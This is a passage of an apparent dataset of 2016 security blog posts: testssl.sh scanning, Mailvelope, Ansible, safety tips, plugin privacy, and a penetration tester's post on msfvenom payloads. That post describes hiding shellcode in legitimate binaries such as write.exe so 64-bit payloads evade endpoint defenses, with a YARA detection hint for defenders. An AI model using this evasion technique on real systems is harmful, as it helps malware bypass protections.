        "output": "Title: \"TestSSL.sh Assessing SSL/TLS Configurations at Scale\"\nTaxonomies: \"Author, David Fletcher, External/Internal, Red Team, cool stuff, shell script, SSL, testssl.sh, TLS, tools\"\nCreation Date: \"Wed, 27 Apr 2016 13:13:36 +0000\"\nDavid Fletcher //\nHave you ever looked at Nessus scan results to find the below in the output? Recently I was on engagement and encountered just this situation.  I found myself wondering how in the world I would validate all of these findings for SSL/TLS.\n\nLuckily, one of my co-workers suggested I take a look at testssl.sh.  This tool sped up the process significantly and I found that I could do some really great things with its output.\nBefore we get into testing at scale, we should become familiar with the tool and its output.  As you\u2019ve probably already guessed, testssl.sh is a shell script that interrogates SSL and TLS configurations to provide comprehensive information on the protocols and cipher suites supported by a service.\nThe tool can be found on GitHub at https://github.com/drwetter/testssl.sh. There are a number of options that can be used to run very specific tests against a service (specific protocols, cipher suites, vulnerabilities, etc). However, since there are numerous findings and a single host is likely to match multiple of those, we\u2019ll opt to run all tests (no arguments). This will provide a great deal of flexibility in reporting. It is worth noting that testssl.sh can evaluate non-HTTP services as well. This article will focus only on HTTP services.\n\nRun against a single host from a terminal testssl returns output that looks very nice with colorization in the terminal output. However, this is somewhat limiting in that it restricts the tester to taking screen captures rather than providing a customer an actual report as output.\nThe terminal coloring that testssl.sh outputs is ANSI Escape Code. As a result, terminal control sequences are intermingled with the output text. This could be troublesome, but there just happens to be a tool named aha (ANSI HTML Adaptor) for Linux that will convert the output that testssl.sh generates into an HTML page as illustrated below.\n\nI\u2019ve found that piping output from testssl.sh through aha has a couple of drawbacks. First, testssl.sh sometimes hangs while enumerating the ciphers supported by SSLv3. If this occurs, we have to break out of the command (CTRL-C) which kills both evaluation and reporting. I\u2019ve also found that aha sometimes encounters a broken pipe error and hangs waiting for input to proceed. Once again, reporting and evaluation both fail due to this issue.\nFor both of these reasons, the best strategy for testing at scale involves the following two steps. First, run testssl.sh in a for loop feeding IP addresses of the hosts under test from a file and limit the runtime of the process. If you really want to speed things up, you can use xargs to make the whole process multi-threaded. Next, capture the raw output from testssl.sh and process it with aha after all of the raw output has been generated. Doing so will allow you to build custom reports focusing on only the details of a specific finding. The raw output will have full details included in it. This means that you can run testssl.sh one time and create custom reports for each individual finding listed.\nLet\u2019s walk through the process.  The first thing you need to do is grab the target IP addresses from the Nessus results. One great way to do this is to use EyeWitness. This tool is best known for assisting in performing quick triage of Nessus scan results. EyeWitness will consume a .nessus file and produce an HTML report with screen captures of all web servers (or rdp/vnc) found in the report. The option that we\u2019re interested in the \u201c--createtargets\u201d switch. This takes the Nessus file and creates a list of URLs in the output text file.\n\nWith the target list generated, the for loop can be built to begin scanning. The following syntax will iterate through each of the URLs (Nessus was configured NOT to resolve names) in the targets file.\nfor FILE in $(cat https_targets.txt); do IP=$(echo $FILE | cut -d '/' -f 3); timeout 20 /opt/testssl/testssl.sh $FILE > $IP.txt; done\nEach host will be scanned with a timeout of 20 seconds and the output will be piped into a text file with the naming convention :.txt. Using the timeout command allows us to avoid the issues with cipher enumeration hangs. Since we\u2019re outputting to a text file we also don\u2019t get broken pipe issues with aha. Note that the timeout value should be tuned to the environment you\u2019re working in to ensure that all output from testssl.sh is captured.\nOnce scanning is complete, we can use the output files to create custom reports that are purpose built for a particular finding. As an example, the cat and egrep commands are used below to gather all of the SSLv2 results from the text files created as a result of scanning. The output produced by this command can also be piped through aha to produce an HTML report that is specific to this finding.\n\nAn example HTML report can be seen below.\n\nSo, go grab a copy of testssl.sh and let your imagination run wild. This tool generates output that is very easy to parse into reports that are focused on specific issues that need to be addressed.\nDon\u2019t forget that validation doesn\u2019t stop here. If you find something that is exploitable (heartbleed, shellshock, etc) make sure that you demonstrate exploitation and put it into context for the organization.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"5 Reasons for Mailvelope & Easy Instructions\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 201, encrypted email, encryption, gpg, mailvelope, passphrase, pgp codes, thunderbird\"\nCreation Date: \"Fri, 29 Apr 2016 14:02:31 +0000\"\nGail Menius //\n\nMy husband set me up with GPG and Thunderbird and it was too hard.\nEthan said it was cool.\nLots of people gave it good reviews.\nIt's open source.\nJohn thought a blog post about mailvelope would be a good idea.\n\n1. My husband set me up with GPG and Thunderbird and it was too hard to use.\nWhen I first started working for BHIS, I told my husband that I needed a key or something for email and I also needed to encrypt my hard drive.  Here is the explanation he gave me\u2026\n\u201cGive me your computer and I\u2019ll fix it.\u201d\nI was like, \u201cOk, Thanks!\u201d\nBecause, to be quite honest, I was too busy to learn.  So then, I continued in ignorance for a while\u2026..\n\nHe set me up with something called firebird (no, that\u2019s a ballet)....Thunderfox (nope, that\u2019s literally nothing I\u2019ve ever heard of before)... Firefox, nope, that\u2019s a browser.  UUUUm, it was a mail application that uses keys\u2026 if you want it to. Ugh, he just previewed my blog and said he did something with Enigmail because something nerdy nerd nerd doesn\u2019t support a blah blah firebird!!!!\n\nAnd then I knew that sometimes people were sending me things that were encrypted and I knew I needed their key and\u2026 I was scared to ask because I didn\u2019t know if it was automatically sent to me or I should just know where it was\u2026.  I was so scared!  Why why why didn\u2019t I know how to encrypt email?\n \n \n2. Ethan said it was cool.\n\nBut then Ethan came to visit the Rapid City office.  He is such a neat guy!  He taught me how to use Mailvelope.  (And use email filters\u2026 oooooooooh email filters).  I\u2019m not sure why, but Mailvelope just seemed intuitive.  I used it on my gmail.  I thought I would show you how to do it on your gmail.  Hold your horses, it\u2019s at the END of the post.\n3. Lots of people gave it good reviews.\nThere are over 200,000 users.  It got an average of 4.55 stars out of 5.  People love it.  But when I went to download the extension, something scary happened.\nIt asked me if I wanted to let Mailvelope read and change all my data on the websites I visit.  WHAT DOES THAT MEAN???!?!?!?!  SO I clicked \u201cview details.\u201d\nOOOH NOOOOO!!! NOW it gets complicated.  How am i going to tell if I can trust this thing?  Do I trust it just because Ethan says so?  DO I read reviews?  Do I know anyone who is a subject matter expert?  I\u2019ll tell you what I learned.\nMailvelope is based on this thing called PGP, pretty good privacy, and a guy almost got in trouble for developing PGP.  Are you down with PGP?  Because Phil Zimmerman is.  And he\u2019s a fellow\u2026 something important about law and Stanford.\n4. It\u2019s open source.\nI also learned that it is OPEN SOURCE and you can see the code on GITHUB. (I can explain what that means too.  I only really know because my husband chatters about open source all the time. ALL THE TIME).  Apparently it\u2019s super nice to write open source code. It\u2019s code that you can see how it works, see all the lines in it.  You can also make it your own, alter it to suit your needs.  It helps the community. Check out how this blog on Creative Commons about how government code should always be open source.  Ohhh, wouldn\u2019t that be cool if our tax dollars paid for code we could use for free?\nSome people say you can\u2019t send secure attachments using Mailvelope.  But I usually just hear of people using box or sending things using encrypted zip, so I wasn\u2019t too concerned with that, so Mailvelope was looking good.\n5. John thought a blog post about mailvelope would be a good idea.\nEveryone at BHIS contributes to the blog.  It\u2019s important to cultivate a culture or sharing.  When I mentioned that I was going to do a blog post on Mailvelope, he thought it was a good idea.  What he didn\u2019t know was that now Heather and I can send secret messages about him using our work email.\n Gail thinks Mailvelope is cool because she can send super secret messages with it to Heather that no one else can read. Which is super cool because John has the ability to read everyone\u2019s email at BHIS and sometimes She doesn't want him to do that.  (Not that he\u2019s nosy or that she has any secrets.)  ***Please ignore the fact that she and Heather could have used  personal email accounts.\nDirections\n\nGo to Mailvelope.  And download the extension for Chrome.\nThis is the extension icon on Chrome once you\u2019ve downloaded it.\nAn electronic menu slides down from the extension bar.  See \u201coptions\u201d in blue? I know it\u2019s small, but you can see it on your own browser.\nThe menu on the left helps lead you to a page you can use to \u201cGenerate\u201d your own \u201ckey.\u201d (You\u2019ll need one if you want to send Heather secret messages.)\nIt WILL ASK YOU FOR A PASSPHRASE.  Remember it.  Don\u2019t write it down.  Don\u2019t even joke about taping it to the back of your keyboard. (It may let you generate a blank key\u2026 don't do that either.)\nThen you freak out because you\u2019ve generated a key but you don\u2019t know where it is.  Lucky for me, it was just hiding under \u201ckey pairs\u201d in \u201cDisplay keys.\u201d\nImport your friends\u2019 keys so you can whisper email secrets to them!  You have to copy and paste the text of their keys.  But if you have txt files, you can upload them instead.\nSend a super secret email!  When you go to your gmail, you can see this weird floating email box looking thing.  Click that and start writing your secrets.  It\u2019ll ask you who you want to encrypt the message for and which key to use to decrypt it.  It\u2019s pretty intuitive after that.\nAfter you click \u201csend,\u201d it\u2019ll ask for that passphrase again.  Always remember your passphrase.  There\u2019s no prompting to help you remember in this program.  Just remember it or it\u2019s lost FOREVER.  There\u2019s nothing more embarrassing than having your security friends find out you forgot your passphrase.  Or is there?\n\nControl the Key\nDuring the creation of this blog, I couldn\u2019t find the key I generated at first.  I sent out an email to the testers and told them I lost the key.  Sally and Ethan were both online and talked a bit about the game of the \u201ckey.\u201d  Sally thought that I should include a bit about keeping control of the key. She said that \u201cmaintaining control of the key is PARAMOUNT.\u201d   she also said \u201cWhen you lose the key or worse yet, someone else gets their hands on it it's game over.\u201d  I think it would be super scary if someone could pretend to be me in email.  So I better train this key to stay in the yard or get an invisible fence.\nI asked Ethan what to do when I thought I had lost they key and he said that \u201cExposure of a private key definitely means you should generate a new key and issue a revocation of your old one (if you can).\u201d Next blog, I\u2019m going to act like I actually lost the key and tell you how to fix it if you do!  \nReferences & Credits\n\nhttp://lifehacker.com/how-to-encrypt-your-email-and-keep-your-conversations-p-1133495744\nEthan Robish (email communication, March 28, 2016)\nSally Vandeven (email communication, March 28, 2016)\n\nPhotos: Click on all photos for their reference.  All used via Creative Commons.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Ansible for Lazy Admins\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Jordan Drysdale, ansible, Config management, CSC #2, lazy admin\"\nCreation Date: \"Mon, 02 May 2016 21:38:41 +0000\"\nJordan Drysdale //\n\nFor the lazy server and system admins, automating those boring functions of updating packages, finding outdated ones, checking scans, et cetera, Ansible has some very nice features. Here is a quick breakdown on some of those features I have found to be very useful (throughout post, useful stuff in bold).\n\nFirst, do yourself a favor and run through the best practices - here. This software is useful and amazing for so many reasons, best summarized as agentless ssh key-auth based systems administration. For the security minded admins, review \"CSC 2: Inventory of Authorized and Unauthorized Software\" - here. Let's say we approve only a particular kernel version and need to know if we have servers that have fallen out of line with approvals:\n\nsystem:~$ ansible droplets -m shell -a \"dpkg -l |grep linux-image*\" -u ansible -K\n\nii  linux-image-3.13.0-85-generic           3.13.0-85.129                amd64                              \nLinux kernel image for version 3.13.0 on 64 bit x86 SMP\n\nii  linux-image-extra-3.13.0-85-generic 3.13.0-85.129                amd64                            \nLinux kernel extra modules for version 3.13.0 on 64 bit x86 SMP\n\nOr, if we have a version of everyone's second favorite text editor that has been identified in a recent CVE:\n\nsystem:~$ ansible droplets -m shell -a \"dpkg -l |grep nano\" -u ansible -K\n\n11.22.33.44 | SUCCESS | rc=0 >>\nii  nano    2.2.6-1ubuntu1     amd64    small, friendly text editor inspired by Pico\n\n33.44.55.66 | SUCCESS | rc=0 >>\nii  nano     2.2.6-1ubuntu1    amd64    small, friendly text editor inspired by Pico\n\nThe above chunked commands are considered ad-hoc. Let's take a look at a YAML file to see what a playbook looks like. Playbooks can be run against all hosts, or subsets depending on your hosts.conf file. This is an apt specific .yml file for updating all packages.\n\nIt can\u2019t be that easy, can it? I can run this on ALL of my servers at once? Yup, and let\u2019s do it!\n\nsystem:/etc/ansible$ ansible-playbook -l droplets roles/common/tasks/apt.yml -u ansible -K\n\nPLAY [all] *********************************************************************\n\nTASK [setup] ******************************************************************\n\nok: [11.22.33.44]\nok: [33.44.55.66]\n\nTASK [Check if there are packages available to be installed/upgraded] **********\n\nchanged: [11.22.33.44]    ###changed here means apt-get upgrade\nchanged: [33.44.55.66]\n\nTASK [Upgrade all packages to the latest version] ******************************\n\nchanged: [11.22.33.44]    ###changed here means apt-get upgrade\nchanged: [33.44.55.66]\n\nTASK [Check if a reboot is required] *******************************************\n\nok: [11.22.33.44]\nok: [33.44.55.66]\n\nTASK [Reboot the server] *******************************************************\n\nskipping: [11.22.33.44]\nskipping: [33.44.55.66]\n\nPLAY RECAP *********************************************************************\n\n11.22.33.44         : ok=4        changed=2        unreachable=0        failed=0  33.44.55.66         : ok=4        changed=2        unreachable=0        failed=0  \n\nOkay, that\u2019s fine and dandy, how about a reboot and a quick check of uptime? These .yml files are super simple, very useful and extremely handy. Again, if you were lazy and didn\u2019t want to touch much of anything, you might want to start digging in to Ansible\u2019s functionality.\n\nCommands for these:\n\nsystem:/etc/ansible$ ansible-playbook -l droplets roles/common/tasks/reboot.yml \n-u ansible -K\n\nsystem:/etc/ansible$ ansible-playbook -l droplets roles/common/tasks/uptime.yml \n-u ansible -K\n\nNext, let\u2019s say I have a very standard way of deploying ssh across my servers and I want it to be super easy. My ssh.yml file will look like this:\n\n---\n\n- hosts: all\n  become: yes\n  tasks:\n   - name: configure ssh options to system spec\n template: src=/etc/ansible/roles/common/templates/ssh.conf.j2 \n dest=/etc/ssh/sshd_config\n         notify:\n          - restart ssh\n          - force ssh update\n         tags: ssh\n\n   - name: be sure ssh is running and restarted\n         service: name=ssh state=restarted enabled=yes\n         tags: ssh\n\nNote the ssh.conf.J2 - this is a standard for deploying templates with Ansible. I have also invested a fair amount of time in creating similar YAML files for deploying ntp, fail2ban, filebeat, sendmail, nginx and a ton of other packages. My favorite one so far, and that is earning me the best of the laziest title, takes a combination of iptables to filter server access services by whitelist, then deploys fail2ban with a generic jail.local file to block malicious auth attempts against various services. Then lastly, it dumps a fully TLS enabled filebeat logger back through a firewall port into an elk stack!\n\nIptables:\n\n---\n\n- hosts: all \n become: yes\n tasks:\n   - name: CAREFUL ## deploy canned iptables ruleset ## CAREFUL\n         copy: src=/etc/ansible/roles/common/templates/iptables.rules.j2 \n dest=/etc/iptables.rules\n         tags: iptables\n\n   - name: CAREFUL ## deploy firewall u+x file to enable iptables rules ## CAREFUL\n         copy: src=/etc/ansible/roles/common/templates/firewall.j2 \n dest=/etc/network/if-up.d/firewall        mode=\"a+x\"\n         tags: firewall\n\nFail2ban:\n\n---\n\n- hosts: all\n  become: yes\n  tasks:\n - name: Install fail2ban\n          apt: pkg=fail2ban state=installed update-cache=yes\n          register: fail2ban_install\n          tags: fail2ban\n\n        - name: Install config\n          template: src=jail.local.j2 dest=/etc/fail2ban/jail.local\n          notify:\n            - reload fail2ban\n\nFilebeat:\n\n---\n\n- hosts: all\n  become: yes\n  tasks:\n   - name: add apt_key for filebeat\n         apt_key: url=https://packages.elasticsearch.org/GPG-KEY-elasticsearch \n state=present\n         tags: apt_key filebeat\n\n   - name: add apt_repo for elastic software\n         apt_repository:\n           repo: \"deb https://packages.elastic.co/beats/apt stable main\"\n         tags: filebeat repo         \n\n   - name: install filebeat\n         apt: pkg=filebeat state=installed update_cache=true\n         tags: filebeat\n\n   - name: create remote directory structure /etc/pki/tls/certs\n         file: path=/etc/pki/tls/certs state=directory mode=0755\n         tags: filebeat tls directories \n\n   - name: copy over the tls verification cert for secure logging\n         copy: src=/etc/ansible/roles/common/files/logstash-forwarder.crt \n dest=/etc/pki/tls/certs mode=0755\n         notify:\n           - restart filebeat\n         tags: filebeat\n\n   - name: deploy standardized internal network config via template\n         template: src=/etc/ansible/roles/common/templates/filebeat.conf.j2 \n dest=/etc/filebeat/filebeat.yml\n         tags: filebeat config template\n\n   - name: be sure filebeat is running\n         service: name=filebeat state=restarted enabled=yes\n         tags: filebeat\n\nBasically, from a Linux administration perspective, Ansible is an excellent choice. What we just went through here is basically still entirely ad-hoc - I stand up a server, create a new user called Ansible, add some keys for authentication and start running playbooks and command scripts. Even better, we can use roles to do almost all of this for us and if we are using AWS or Digital Ocean. Even better yet, we can pre-bake keys and users. If you get to this point, take a look at this last hyperlink - it describes how to bake all of your .yml scripts into a single playbook for use as a \u201cbootstrapper.\u201d Build a Linux box, add a key for Ansible to authenticate with, in five minutes I have a system online, fully firewalled, logging enabled, configured to spec, completely patched, booted and contributing services to digital hyperspace.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"15 Ways to Be a Safer Computer User\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, basic stuff, dark alleys, internet safety, listicles, safe computer usage, tips for your mom, your mom\"\nCreation Date: \"Fri, 06 May 2016 17:54:46 +0000\"\nSierra Ward //\n\nEditor\u2019s note: Though infosec professionals may see this advice as basic to the point of being obvious, as we visit with people and interact with swaths of other industries, we realize that it isn\u2019t. Even if you know about security, you know many people who think even basic information security is an enigma (ie. your mom). Sometimes when we know very advanced stuff it\u2019s hard to explain the most basic steps, but the most basic steps have value so share this with someone you care about.\n\nA couple of months ago I was reading the newspaper and saw that our small town was having a rash of car break-ins. Horrified, I read the articles closely. They were happening at a certain time and place and then I read a quote from a police officer, \u201cPeople are advised to take their keys with them when leaving the vehicle, lock their doors, and keep all valuables out of sight.\u201d Apparently the thieves had walked up to unlocked cars, taken wallets out of purses left on front seats and realized it was so easy they\u2019d done it several times. *facepalm... It\u2019s easy to live in a small town and think that the evils of the world can\u2019t touch us.\n\nThe way we deal with our computers is very similar to this, we assume that nobody would care or be interested in what we are doing online or have on our computers and that we don\u2019t need to really take information security very seriously. But that\u2019s as foolish as leaving your keys in the car with your wallet on the front seat!\n\nFirst, let\u2019s establish that bad guys will do bad things, nothing will stop someone that\u2019s motivated to do those bad things. A thief can certainly smash your car window in and take your entire car, but that\u2019s going to attract a lot more attention, possibly set off an alarm and get people calling the police. We still can take the keys, lock the doors and hide our money. We want to make it more annoying and slightly more difficult for a thug to get what he\u2019s after. Many times bad guys will get annoyed and move on to a target that requires less work - because the world is full of suckers. \n\nYou\u2019re not a sucker, so start making these small changes to the way you conduct your own information security!\n\nWe should think of security as many layers of protection. One layer won\u2019t keep you safe, but many smaller layers will keep you safer than one or none.  Here are 15 things to do, not arranged in any particular order of importance.  They\u2019re ALL important!\n\nUse anti-virus. Yes yes yes, John says to kill it. But what he means is that AV alone won\u2019t do the trick. It\u2019s not a \u201cset it and walk away\u201d deal. It\u2019s one simple layer. It won\u2019t catch everything (not even close) but it\u2019s still worth enabling. If you\u2019re running Windows, the built-in one is fine, just make sure it\u2019s on. Even a free one is fine. Test it out by downloading the inane fake virus, Eicar. It\u2019s safe and does nothing, but should be caught by every AV program.\n\nEnable your firewall. \n\nEnable full disk encryption (on a Mac it\u2019s FileVault, on Windows Bitlocker).\n\nMake sure your passwords are long 20 characters - like a sentence only you would know, something like \u201cMakeupyourownpassword.Don\u2019tusethisone.\u201d. (And PLEASE, use a password manager!)\n\nDon\u2019t reuse passwords (Are you using a password manager? People reuse passwords when they\u2019re having a hard time remembering the four billion passwords they need. Stop trying, and get a password manager.)\n\nEnable 2-step authentication.\n\nUse an Adblocker in your browser. (Browsers have extensions you can set up in the settings.) So much malware/ransomware comes through advertisements on websites you would otherwise trust!\n\nBlacklist (tell your browser what kinds of traffic aren\u2019t allowed.) This is especially useful if you have kids in your household, who might stumble across unseemly things. Set up Open DNS to help. (Directions at their website).\n\nMake sure your network/Wi-Fi is password protected with a strong password. There\u2019s a good chance your mom has Wi-Fi (how modern) but she never put a password on it, and it\u2019s open to the entire neighborhood. Or it might have just the default password still. Change that. \n\nTreat every environment as if it\u2019s hostile. You wouldn\u2019t walk up to a stranger in a coffee shop and give them your social security number and birthdate, so why are you using free Wi-Fi? If you must use free Wi-Fi, get yourself a VPN with 2-factor authentication. (Or use your phone\u2019s hotspot/internet).\n\nAlways keep your system and application updated. It\u2019s too easy to ignore this when your computer alerts you, but do them ASAP! One word of caution, if a program pops up and says, \u201cI need to be updated, allow,\u201d don\u2019t. Cancel out and visit the website directly to check. Sometimes malware poses as a program you already likely have in order to get itself installed onto your system. Be careful.\n\nEducate yourself about phishing attacks, be wary of opening attachments and links even from people whom you know. If anything looks suspicious call and ask the person what they sent and if they did actually send it.\n\nIf someone calls you saying you have a virus on your computer and they can help you get it off, HANG UP! And do not, ESPECIALLY DO NOT, give them any kind of personal information or your credit card. How many of our parents/grandparents have already fallen for this scheme? These people are con artists, preying on the uninformed. Be informed. (My grandma fell for this, and it makes me sad.  Don\u2019t let this happen to yours.)\n\nCover up your webcam when you\u2019re not using it. It\u2019s one of the easiest things ever to turn this on remotely and watch you.\n\nIn general, take the stance that the internet is a dangerous place. We all need to go there, but we don\u2019t all have to be morons when we\u2019re there. Pay attention to the URLs you visit, the things people ask you to download, the popups. You wouldn\u2019t wander into dark alleys in a city, and if you found yourself there you\u2019d be sure to be hyper-aware.  If someone offered you a drink in that dark alley you sure wouldn\u2019t take it, would you?  The same goes for your life on the internet, and the things people are asking you to do.\n\nThis might seem like an overwhelming task. There might be a part of you that\u2019s tempted to just give up, ignore this problem and hope it never bites you. \n\nNone of these things is too hard. If you aren\u2019t sure how to do one, ask someone. Or Google it. Or search around until you figure it out. \n\nThe best way to learn is to have a problem and try and fix it. Not only will you learn more about where things are located on your computer, but you\u2019ll become more familiar with it as a whole. If you have learned to use a computer, you can learn to be safer about using a computer! \n\nMore good stuff here: http://krebsonsecurity.com/tools-for-a-safer-pc/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Advanced Msfvenom Payload Generation\"\nTaxonomies: \"Author, Joff Thyer, Red Team, KALI, payload generation, PEInsider, PowerShell, shellcode\"\nCreation Date: \"Tue, 10 May 2016 14:07:16 +0000\"\nJoff Thyer // \n\nIt has been known for some time that an executable payload generated with msfvenom can leverage an alternative template EXE file, and be encoded to better evade endpoint defenses. Having said that, what is the standard process for producing an EXE format without using an alternative template file?  If like many of us, you are using the KALI penetration testing distribution, the template files used for EXE generation are included with the Metasploit software.  They are located in the directory \u201c/usr/share/metasploit-framework/data/templates\u201d on the current KALI distribution (as of the date of this article).\n\nIf you generate a 32-bit EXE format for Windows, the template file \u201ctemplate_x86_windows.exe\u201d is used, and if you generate a 64-bit EXE format for Windows, the template file \u201ctemplate_x64_windows.exe\u201d is used.\n\nA few years back, the Metasploit framework required that a template EXE file had a buffer (usually 4096 bytes in length) with the fixed string of \u201cPAYLOAD:\u201d contained at the beginning of said buffer.  The template EXE files were written such that they used \u201cVirtualAlloc\u201d, then a \u201cMemCpy()\u201d (memory copy), and then called the shellcode directly after it had been copied into an executable section of memory.  This technique is still present in the DLL payloads but is no longer present for EXE payload generation.  Interestingly, the 64-bit payload template still has this buffer allocation contained within it, even though the function of that EXE file is now irrelevant.\n\nToday, Metasploit (msfvenom) generates payloads in EXE format by placing the shellcode either directly in the \u201c.text\u201d section of the PE/COFF file, or creating a new random executable section name and playing the shellcode into that new section.  Then the code entry point address is modified to point at the new code, and the EXE file is saved.  Thus, by using this technique, almost any executable file can actually be used as a template.\n\nThere is an interesting additional command line flag to \u201cmsfvenom\u201d to change the format to \u201cexe-only\u201d rather than \u201cexe\u201d.  This flag has the effect of either creating a new section header or modifying the existing \u201c.text\u201d section in the case of 64-bit binaries.  In the case of 32-bit binaries, the shellcode ends up in the \u201c.text\u201d section regardless, however, the characteristics flags differ and some extra assembly code are introduced in the \u201cexe-only\u201d version.\n\nWhat does this all mean?  Well frankly, this gives us additional mechanisms and possibilities to evade endpoint defenses as we leverage the idea of both modifying the PE/COFF section headers and using a well-known binary (such as write.exe or notepad.exe) for the template.  I took a deeper look at the 64-bit case as it seems that endpoint defenses are not quite as adept at firing signatures on Metasploit 64-bit binaries.\n\nTo examine the differences, I used a program called \u201cPEInsider\u201d which allows us to view the structure of the PECOFF file.  These are the two different \u201cmsfvenom\u201d commands I used to generate the binary files.  Notice the \u201c-f exe\u201d versus \u201c-f exe-only\u201d flags.\n\nIn both cases above, we use the Windows file of \u201cwrite.exe\u201d as the template rather than Metasploit\u2019s standard template file.  Taking a look with the PEInsider program, we can see that in the first case (EXE), a new section header is added with a random name, and the code entry point adjusted to hex 6000.  In the second case (EXE-ONLY) the existing \u201c.text\u201d section is modified.  Also, in both cases the section containing the shellcode is marked as \u201cwriteable\u201d in addition to the standard flags of \u201cexecutable\u201d, \u201creadable\u201d, and \u201ccontains code\u201d.\n\n 64-bit Payload Using the \u201c-f exe\u201d Flag \n\n 64-bit Payload Using the \u201c-f exe-only\u201d Flag \n\nWhy is this interesting?  Well, it appears that in the past, folks in the penetration testing community have been overly focused on using shellcode encoding as a potential detection evasion technique.  This is a bit of a fallacy as the standard Metasploit template itself is a dead giveaway regardless of the shellcode contained within, and more to the point, encoding shellcode was historically more about fitting the payload to the environmental conditions rather than evasion.  (ie: what if an input buffer cannot accept a specific character?)\n\nSecondly, it has been my experience that the endpoint defense vendors do a pretty good job of picking up 32-bit payloads, but have fallen somewhat short with respect to 64-bit payloads.  Not surprisingly, most environments are solidly running 64-bit systems today which means we all should not ignore the 64-bit attack surface and defense requirements.\n\nUsing either a unique template EXE or something that is a legitimate O/S binary along with potentially leveraging different PE/COFF output formats yields opportunities for evasion.  In addition, defenders should be cognizant of the fact that multiple 64-bit binary formats are possible.  In particular, some carefully crafted YARA rules could assist in finding unusual payloads, especially those with E0000020 as the characteristics flags on the \u201c.text\u201d section, indicating that the \u201cwritable\u201d flag is set, versus 60000020, which is a more normal setting for flags set on the \u201c.text\u201d section.\n\nWhile it is tempting to always use the new sexy PowerShell goodness, what is old can be new again and result in a very effective and successful evasion technique.  In fact, the new PowerShell techniques are where the attention and focus on endpoint defenses now lie. It is important to keep a diverse set of tricks, and deep grab bag of tools that you just might need.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Browser Plugin Oversharing\"\nTaxonomies: \"Author, Brian King, InfoSec 201, browser plug-ins, browsers, privacy, security, they're watching, wappalyzer\"\nCreation Date: \"Wed, 11 May 2016 14:46:14 +0000\"\nBrian King //   \n\nDo you know what that browser plugin is doing? \n\nThere\u2019s a browser plugin for just about everything. You can find one to change the name of your least-favorite politician into something offensive on every page you visit. There are malware blockers and password managers. Gail covered one to make PGP a little easier not too long back on this very blog.\n\nThe thing they all do, though, is they operate inside your browser. The web browser may well have displaced the medical exam room on the list of places where it\u2019s hardest to hide something. Even when you want to do something privately online - when you delete your cookies or use incognito mode, or a search engine that promises not to track you - you still use a browser to find what you\u2019re looking for. Your browser is in a position to know an awful lot about you, and plugins can know anything the browser knows.\n\nSo, when you find one that looks helpful, it\u2019s worth a look to see what it\u2019s actually doing with all the information you make available to it. Sometimes they do more than you\u2019d expect.\n\nOn webapp tests, I sometimes use one called Wappalyzer to quickly identify what third-party components are involved in a website. It shows logos in the address bar to tell you what it\u2019s found.\n\nLook at all that stuff from the newspaper!\n\nThe installation page describes in general what the plugin does, and links to a FAQ. The last question in the FAQ tells you that the extension sends \u201canonymous information about websites you visit to wappalyzer.com,\u201d and describes pretty clearly what that information is, and what it\u2019s used for. You had to know it would do something like that. And you can opt out, so it\u2019s all on the up and up so far.\n\nAnyhow, I wondered what exactly might get sent back to them, and whether that might include confidential information about the sites I test for our customers.\n\nSo did some aimless browsing on both public sites and internal sites on my own network, while capturing traffic in BurpSuite. As I went, I noticed occasional POST requests to a Wappalyzer URL that had a single large JSON object in the postdata.\n\nHey, what\u2019s all that?\n\nSpeaking of plugins, there\u2019s one called JSBeautifier for BurpSuite, which makes that kind of data far more readable:\n\nDecoded post data\n\nThis accurately shows that I was on Reddit and clicked a link that took me to Walmart. It also doesn\u2019t include the actual path I was on at either location, which is in line with their description. This doesn\u2019t say exactly what I was looking at in either place, but it does say where I started, where I went, and when I did it (startTime is a Unix epoch timestamp).\n\nFarther down, it shows the full URLs to some components. Some of these are the things it\u2019s looking for to show me with those icons in the address bar. Most are generic URLs, but some have random-looking strings in them, which may (or may not) be user-specific.\n\nAbove: Some generic JS my browser picked up from Google\n\nAbove: A less-generic URL to doubleclick\n\nThat doubleclick.net URL is 1,580 characters long, and it includes some pretty specific information about me, including my physical location down to the ZIP code (probably by reverse IP lookup), the web browser I\u2019m using, a few parameters that are GUIDs (globally-unique identifiers, which could be specific to me or not), and ... the full URL of the page I was on at Walmart at the time.\n\nThat\u2019s a full URL...\n\nThis contradicts what Wappalyzer says in their FAQ (https://wappalyzer.com/faq):\n\nWappalyzer FAQ Excerpt\n\nNow, given how deeply that was buried, and that the thing they collected was not a URL I actively visited, but one that was added by a tracker on a site that I visited, this may be an oversight on Wappalyzer\u2019s part. But it pretty clearly does include a full URL, and enough other information to fairly uniquely identify me - visited hosts, ZIP code, timestamp, and browser user-agent. And then we have those GUIDs, which may (or may not) identify me alone.\n\nThe other question was about non-public sites I\u2019d visit. I often test sites on a customer\u2019s intranet, or sites that are only available by VPN or otherwise shouldn\u2019t be publicly disclosed. How could Wappalyzer possibly identify those and exclude them? Their FAQ doesn\u2019t mention this at all, so my assumption was that these more sensitive locations wouldn\u2019t get any special treatment. And it turned out that even the most obviously \u201cnot public\u201d site of all - localhost - is included in the message.\n\nInternal Site Included\n\nThis one doesn\u2019t include any real path information: that string of digits doesn\u2019t point to anything on my localhost web server. But it does disclose the internal hostname, the date & time I visited it, and the fact that it exists. All of that may be more than a customer would like me to reveal to a third party.\n\nMy takeaways from this little exercise:\n\nI need to remove this plugin before testing anything non-public.\n\nThe privacy measures described in the FAQ are not completely in force.\n\nBrowser plugins sit in a very privileged place, and should be chosen with great care.\n\n"
    },
    {
        "input": "",
        "instruction": "",
